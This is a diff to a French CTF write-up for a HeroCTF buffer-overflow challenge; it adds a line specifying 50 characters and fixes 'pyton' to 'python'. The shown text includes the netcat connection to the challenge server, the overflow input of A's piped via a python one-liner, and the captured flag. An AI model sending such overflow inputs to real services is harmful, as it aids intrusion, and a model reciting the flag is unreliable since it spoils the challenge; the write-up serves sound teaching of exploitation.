@@ -19,6 +19,7 @@ if (check!= 0xdeadbeef){
 ```
 On comprend donc ici qu'il va falloir overflow le buffer où est stocké l'input (buf) pour aller modifier la valeur du check.
 Pour ceci, on entre dans l'input plus de caractères que le buffer ne peut en contenir (40).
+50 caractères, par exemple.
 ```bash
 $ nc heroctf.fr 3000
 Déborde moi mon cochon : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -27,7 +28,7 @@ GG wola tu m'as eu
 HeroCTF{1_l0v3_buff3r_0v3rfl0w_10493}
 Voilà ton flag petit fou.
 ```
-Ou en utilisant pyton
+Ou en utilisant python :
 ```bash
 $ python -c "print('A'*50)" | nc heroctf.fr 3000
 Déborde moi mon cochon : 
